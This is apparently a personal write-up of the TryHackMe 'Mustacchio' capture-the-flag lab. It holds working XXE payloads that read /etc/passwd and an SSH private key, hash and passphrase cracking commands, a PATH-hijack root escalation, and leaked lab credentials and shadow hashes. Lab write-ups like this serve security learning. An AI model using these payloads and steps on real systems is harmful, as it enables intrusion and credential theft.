[https://tryhackme.com/room/mustacchio](https://tryhackme.com/room/mustacchio)  
'''  
22  
80  
8765
 
Apache/2.4.18
 
/custom  
/images
 
admin:bulldog19
 
name: Barry Clad  
can ssh using key
 
Joe Hamd  
'''
 
nmap -vv -n -p 1-9999 ip  
dirbuster dir -u ip -w directory-list-medium-1.0.txt
 
found users.bak in /custom/js
 
sqlite3 users.bak  
SELECT * FROM USERS;  
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b >sha1  
.quit
 
hashcat -a o -m 100 hash.txt rockyou.txt
 
admin:bulldog19
 
<><> cant find login page
 
found it ip:8765 (from nmap enumeration)
 
login to admin page  
go to page source, says Example=/auth/dontforget.bak
   

curl ip:8765/auth/dontforget.bak  
>> null message, rabit hole
 
XXE payload into comment section:
 
- to find barry's home directory:
 
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE foo [  
<!ELEMENT foo ANY>  
<!ENTITY xxe SYSTEM "[file:///etc/passwd](file:///etc/passwd)">]>  
<comment>  
<name>Joe Hamd</name>  
<author>Barry Clad</author>  
<com>&xxe;</com>  
</comment>
 
- to assume and find barry's private key:  
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE foo [  
<!ELEMENT foo ANY>  
<!ENTITY xxe SYSTEM "[file:///home/barry/.ssh/id_rsa](file:///home/barry/.ssh/id_rsa)">]>  
<comment>  
<name>Joe Hamd</name>  
<author>Barry Clad</author>  
<com>&xxe;</com>  
</comment>
 
-----BEGIN RSA PRIVATE KEY-----  
Proc-Type: 4,ENCRYPTED  
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E
 
jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN  
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU  
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65  
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D  
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E  
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ  
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie  
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC  
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX  
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk  
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8  
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+  
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki  
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7  
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs  
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg  
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o  
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK  
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF  
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF  
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs  
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of  
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ  
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn  
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD  
-----END RSA PRIVATE KEY-----
   

python3 ssh2john.py id_rsa > forjohn.txt  
john forjohn.txt  
:: urieljames
 
ssh -i id_rsa barry@ip  
passphrase: urieljames
 
user.txt
 
find / -type f -user root -perm /4000 2>/dev/null
 
/home/joe/live_log  
strings live_log
 
"tail ..." (tail command used without full path)
 
cd /tmp  
export PATH=/tmp:$PATH  
nano tail  
'''  
#!/usr/bin/perl  
system("/bin/bash")  
'''  
chmod +x tail  
./live_log
 
root.txt
 
<>/etc/shadow<>
 
vagrant:$6$rxWldag3$UH9F1UZhDQEKKleaid9QNzH7n1uDIJgdnGP01X5lwo4HAAO292zKrLCM5Gk1j5g4sacRoNR2b790HUGSNA/Wn.:18739:0:99999:7:::  
joe:$6$Knz6FBbL$UEDnt.pkH6ZEDf/R4cJMLXP36diGxbnUoocdFrYWRybQ58DOP9kE4vgcU9CZXQ2e/l/HQ8UZFrQXsZTB8ZYPy1:18790:0:99999:7:::  
barry:$6$230tFyKx$W3A2JMRqNrW2bFT/XsCNoPNDlTjxlqAkmLSyC9EHxRLLce8AlHQWwidzC.SSVIqzB64.zLjUTMWgrrfv0UqjG0:18790:0:99999:7:::